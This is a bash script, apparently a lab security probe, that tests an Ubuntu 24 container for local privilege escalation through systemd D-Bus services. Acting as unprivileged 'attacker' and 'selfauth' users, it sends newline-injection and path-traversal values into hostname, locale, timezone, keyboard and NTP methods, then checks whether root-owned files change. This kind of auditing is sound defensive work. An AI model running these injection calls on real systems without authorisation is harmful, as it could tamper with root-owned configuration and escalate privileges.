#!/usr/bin/env bash
set -euo pipefail

target="${1:-ubuntu24-server-lpe-target}"

dx() {
  docker exec "$target" bash -lc "$1"
}

section() {
  printf '\n## %s\n' "$1"
}

section "target"
dx 'cat /etc/os-release | sed -n "1,12p"; uname -a; id attacker; id selfauth'

section "package versions"
dx 'dpkg-query -W dbus systemd systemd-timesyncd polkitd locales console-setup keyboard-configuration netplan.io 2>&1 | sort'

section "default D-Bus and unit reachability"
dx 'busctl --system list --no-pager | egrep "hostname1|locale1|timedate1|timesync1|network1|netplan|PolicyKit1" || true'
dx 'systemctl is-enabled systemd-hostnamed.service systemd-localed.service systemd-timedated.service systemd-timesyncd.service systemd-networkd.service systemd-networkd.socket 2>&1 || true; systemctl is-active systemd-hostnamed.service systemd-localed.service systemd-timedated.service systemd-timesyncd.service systemd-networkd.service systemd-networkd.socket 2>&1 || true'
dx 'systemctl show -p ActiveState -p SubState -p UnitFileState -p ConditionResult systemd-timesyncd.service systemd-networkd.service systemd-networkd.socket'

section "polkit mutator defaults"
dx 'for f in /usr/share/polkit-1/actions/org.freedesktop.hostname1.policy /usr/share/polkit-1/actions/org.freedesktop.locale1.policy /usr/share/polkit-1/actions/org.freedesktop.timedate1.policy /usr/share/polkit-1/actions/org.freedesktop.timesync1.policy /usr/share/polkit-1/actions/org.freedesktop.network1.policy; do echo "### $f"; grep -E "<action id=|<allow_any>|<allow_inactive>|<allow_active>" "$f"; done'

section "root-owned state before"
dx 'for p in /etc/hostname /etc/machine-info /etc/locale.conf /etc/default/locale /etc/default/keyboard /etc/localtime /etc/systemd/timesyncd.conf; do if [ -e "$p" ]; then ls -ld "$p"; sha256sum "$p" 2>/dev/null || true; else echo "MISSING $p"; fi; done; find /etc/netplan -maxdepth 2 -printf "%m %u:%g %p\n" | sort; find /etc/netplan -xdev -type f -exec sha256sum {} + 2>/dev/null | sort || true'

section "method surface"
dx 'for spec in "org.freedesktop.hostname1 /org/freedesktop/hostname1" "org.freedesktop.locale1 /org/freedesktop/locale1" "org.freedesktop.timedate1 /org/freedesktop/timedate1" "org.freedesktop.timesync1 /org/freedesktop/timesync1" "org.freedesktop.network1 /org/freedesktop/network1" "io.netplan.Netplan /io/netplan/Netplan"; do set -- $spec; echo "### $1 $2"; timeout 6 busctl --system introspect "$1" "$2" --no-pager 2>&1 | sed -n "1,80p" || true; done'

section "attacker and selfauth state-changing calls"
dx '
now_usec=$(($(date +%s)*1000000))
call_as() {
  local user="$1"
  local label="$2"
  shift 2
  echo "### $user: $label"
  runuser -u "$user" -- "$@" 2>&1
  local rc=$?
  if [ "$rc" -ne 0 ]; then
    echo "exit_status=$rc"
  fi
}
for user in attacker selfauth; do
  call_as "$user" "hostname SetStaticHostname valid no-interaction" busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetStaticHostname sb codex-dbus-probe false
  call_as "$user" "hostname SetPrettyHostname valid interaction" busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetPrettyHostname sb "Codex Probe" true
  call_as "$user" "hostname SetPrettyHostname newline/path interaction" busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetPrettyHostname sb $'"'"'codex pretty\nX=/tmp/lpe'"'"' true
  call_as "$user" "hostname SetLocation pathlike interaction" busctl --system call org.freedesktop.hostname1 /org/freedesktop/hostname1 org.freedesktop.hostname1 SetLocation sb ../../tmp/lpe true
  call_as "$user" "locale SetLocale valid interaction" busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetLocale asb 1 LANG=C.UTF-8 true
  call_as "$user" "locale SetLocale newline interaction" busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetLocale asb 1 $'"'"'LANG=C.UTF-8\nX=/tmp/lpe'"'"' true
  call_as "$user" "locale SetX11Keyboard valid interaction" busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetX11Keyboard ssssbb us pc105 "" "" true true
  call_as "$user" "locale SetX11Keyboard newline interaction" busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetX11Keyboard ssssbb $'"'"'us\nX=/tmp/lpe'"'"' "" "" "" true true
  call_as "$user" "locale SetVConsoleKeyboard pathlike interaction" busctl --system call org.freedesktop.locale1 /org/freedesktop/locale1 org.freedesktop.locale1 SetVConsoleKeyboard ssbb ../../tmp/lpe "" true true
  call_as "$user" "timedate SetTimezone valid interaction" busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetTimezone sb Etc/UTC true
  call_as "$user" "timedate SetTimezone path traversal interaction" busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetTimezone sb ../../tmp/lpe true
  call_as "$user" "timedate SetLocalRTC no-op interaction" busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetLocalRTC bbb false true true
  call_as "$user" "timedate SetTime current no-interaction" busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetTime xbb "$now_usec" false false
  call_as "$user" "timedate SetNTP interaction" busctl --system call org.freedesktop.timedate1 /org/freedesktop/timedate1 org.freedesktop.timedate1 SetNTP bb true true
  call_as "$user" "timesync SetRuntimeNTPServers interaction" timeout 8 busctl --system call org.freedesktop.timesync1 /org/freedesktop/timesync1 org.freedesktop.timesync1.Manager SetRuntimeNTPServers as 1 $'"'"'127.0.0.1\nX=/tmp/lpe'"'"'
  call_as "$user" "network1 Reload" timeout 8 busctl --system call org.freedesktop.network1 /org/freedesktop/network1 org.freedesktop.network1.Manager Reload
  call_as "$user" "netplan Config" busctl --system call io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Config
  call_as "$user" "netplan Generate" busctl --system call io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Generate
  call_as "$user" "netplan Apply" busctl --system call io.netplan.Netplan /io/netplan/Netplan io.netplan.Netplan Apply
done'

section "root-owned state after"
dx 'for p in /etc/hostname /etc/machine-info /etc/locale.conf /etc/default/locale /etc/default/keyboard /etc/localtime /etc/systemd/timesyncd.conf; do if [ -e "$p" ]; then ls -ld "$p"; sha256sum "$p" 2>/dev/null || true; else echo "MISSING $p"; fi; done; find /etc/netplan -maxdepth 2 -printf "%m %u:%g %p\n" | sort; find /etc/netplan -xdev -type f -exec sha256sum {} + 2>/dev/null | sort || true'

section "cleanup"
dx 'systemctl stop systemd-hostnamed.service systemd-localed.service systemd-timedated.service 2>/dev/null || true; echo "stopped transient hostnamed/localed/timedated if active"; systemctl is-system-running 2>&1 || true'
